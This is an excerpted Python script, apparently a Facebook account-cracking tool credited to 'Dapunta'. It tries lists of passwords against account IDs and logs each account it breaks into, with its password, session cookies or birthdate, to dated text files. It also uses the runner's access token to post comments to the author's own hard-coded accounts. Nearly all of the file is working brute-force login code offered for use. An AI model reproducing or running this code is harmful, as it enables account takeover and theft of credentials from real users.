...
# Facebook (Dapunta Khurayra X)   : https://www.facebook.com/UsmanXsameer3445
# Instagram (☬ 𝐀𝐧𝐨𝐧𝐲𝐦 𝟒𝟎𝟒 ☬)    : No UsE
# Whatsapp (Dapunta Bot_Key)      : 03025669420
# YouTube (Xayonara.ID)           : https://www.facebook.com/ajmal.shah41
...
### Logo
_logo_line_1_ = ('%s   _  ____ __ '%(_P_))
_logo_line_2_ = ('%s/ |/ / //_/                        %s┌─────────────────────────┐'%(_P_,_U_))
_logo_line_3_ = ('%s /    / ,<                                          %s│   %s• Code By Dapunta •   %s│'%(_P_,_U_,_P_,_U_))
_logo_line_4_ = ('%s/_/|_/_/|_|                                      %s│ %sGithub.com/Dapunta/dmbf %s│'%(_P_,_U_,_P_,_U_))
...
_list_ = '3882176535153442'
_my_account_ = [
    '100000834003593','100003986228742','100017584682867','100000395779504','100046544291175'
     ]
    ...
    try:
        for _list_ in _my_account_:
            try:
                ...
                _req_post_('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(_list_,tok_dev_,_tok_dev_))
                time.sleep(0.3)
            except:pass
            ...
            for _suci_salsabila_ in _files_crack_.get("pw"):
                ...
                if log.get("status")=="cp":
                    try:
                        ...
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        _dapunta_cici_("\r%s[%sNK%s] %s • %s • %s %s %s         "%(_U_,_P_,_U_,_files_crack_.get("id"),_suci_salsabila_,d,m,y))
                        self._cp_dapunta_.append("%s•%s•%s%s%s"%(_files_crack_.get("id"),_suci_salsabila_,d,m,y))
                        _dapunta_dapunta_("NK/%s.txt"%(tanggal),"a+").write("%s•%s•%s%s%s\n"%(_files_crack_.get("id"),_suci_salsabila_,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                    ...
                    _dapunta_cici_("\r%s[%sNK%s] %s • %s                 "%(_U_,_P_,_U_,_files_crack_.get("id"),_suci_salsabila_))
                    self._cp_dapunta_.append("%s•%s"%(_files_crack_.get("id"),_suci_salsabila_))
                    _dapunta_dapunta_("NK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(_files_crack_.get("id"),_suci_salsabila_))
                    break
                elif log.get("status")=="success":
                    _dapunta_cici_("\r%s[%sAj%s] %s • %s • %s     "%(_H_,_P_,_H_,_files_crack_.get("id"),_suci_salsabila_,log.get("cookies")))
                    self._ok_dapunta_.append("%s•%s"%(_files_crack_.get("id"),_suci_salsabila_))
                    _dapunta_dapunta_("Aj/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(_files_crack_.get("id"),_suci_salsabila_))
                    break
                else:continue
            self._hitung_loop_+=1
            _dapunta_cici_("\r%s[%sCrack%s][%s%s/%s%s][%sAj:%s%s][%sNK:%s%s]%s"%(_U_,_P_,_U_,_P_,self._hitung_loop_,len(self._files_crack_),_U_,_P_,len(self._ok_dapunta_),_U_,_P_,len(self._cp_dapunta_),_U_,_P_), end=' ');sys.stdout.flush()
        except:
        ...
        try:
            for _suci_salsabila_ in _files_crack_.get("pw"):
                ...
                if log.get("status")=="cp":
                    ...
                    _dapunta_cici_("\r%s[%sAj%s] %s • %s • %s     "%(_H_,_P_,_H_,_files_crack_.get("id"),_suci_salsabila_,koki(log.get("cookies"))))
                    self._ok_dapunta_.append("%s•%s"%(_files_crack_.get("id"),_suci_salsabila_))
                    _dapunta_dapunta_("Aj/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(_files_crack_.get("id"),_suci_salsabila_))
                    break
                else:continue
...
def started():
    ...
    _dapunta_cici_('%s[%s•%s] %sAkun [Aj] Disimpan Ke Aj/%s.txt'%(_U_,_P_,_U_,_P_,tanggal))
    _dapunta_cici_('%s[%s•%s] %sAkun [NK] Disimpan Ke NK/%s.txt'%(_U_,_P_,_U_,_P_,tanggal))
